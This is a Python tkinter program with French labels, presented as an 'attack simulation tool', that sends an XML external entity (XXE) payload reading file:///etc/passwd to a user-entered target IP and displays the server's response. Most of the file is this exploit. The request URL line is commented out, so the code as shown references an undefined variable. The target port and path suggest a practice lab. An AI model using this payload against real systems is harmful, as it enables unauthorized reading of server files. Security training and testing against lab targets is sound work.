import tkinter as tk
from tkinter import messagebox
import requests
from bs4 import BeautifulSoup

class ResultWindow(tk.Toplevel):
    def __init__(self, master, results):
        super().__init__(master)
        self.title("Résultats de l'attaque")
        self.geometry("400x300")

        self.results_text = tk.Text(self, wrap=tk.WORD)
        self.results_text.insert(tk.END, results)
        self.results_text.pack(expand=True, fill=tk.BOTH)

class AttackerTool:
    def __init__(self, master):
        self.master = master
        master.title("Outil de Simulation d'Attaques")

        self.target_ip_label = tk.Label(master, text="Adresse IP de la cible:")
        self.target_ip_label.pack()

        self.target_ip_entry = tk.Entry(master)
        self.target_ip_entry.pack()

        self.attack_button = tk.Button(master, text="Lancer l'attaque", command=self.launch_attack)
        self.attack_button.pack()

    def xxe_attack(self, target_ip, xml_payload):
        #url = f"http://{target_ip}:3000/XXE#/" url de ta cible ou se trouve la vulnérabilité cherché
        headers = {'Content-Type': 'application/xml'}
        response = requests.post(url,data=xml_payload,headers=headers)
        return response.text
    def generate_xxe_payload(self):
        # Générattion  d'un payload XXE simple 
        payload = """
            <?xml version="1.0"?>
            <!DOCTYPE data [
                <!ELEMENT data (#ANY)>
                <!ENTITY xxe SYSTEM "file:///etc/passwd">
            ]>
            <data>&xxe;</data>
        """
                
        
        return payload

    def launch_attack(self):
        target_ip = self.target_ip_entry.get()

        if not target_ip:
            messagebox.showerror("Erreur", "Veuillez entrer l'adresse IP de la cible.")
            return

        try:
            xxe_payload = self.generate_xxe_payload()
            xxe_result = self.xxe_attack(target_ip, xxe_payload)

            # Affichage des résultats
            result_window = ResultWindow(self.master, xxe_result)
            result_window.grab_set()  # Empêche l'interaction avec la fenêtre principale lors de l'affichage des résultats
        except Exception as e:
            messagebox.showerror("Erreur", f"Une erreur s'est produite : {str(e)}")

def main():
    root = tk.Tk()
    app = AttackerTool(root)
    root.mainloop()

if __name__ == "__main__":
    main()